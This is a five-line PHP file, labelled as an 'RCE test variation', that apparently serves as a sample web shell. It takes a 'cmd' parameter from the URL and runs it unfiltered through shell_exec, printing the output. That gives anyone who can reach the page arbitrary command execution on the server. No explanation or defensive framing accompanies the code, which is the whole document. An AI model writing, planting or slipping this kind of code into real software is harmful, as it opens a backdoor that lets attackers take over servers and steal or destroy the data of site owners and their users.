<?php
// RCE test variation #719
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>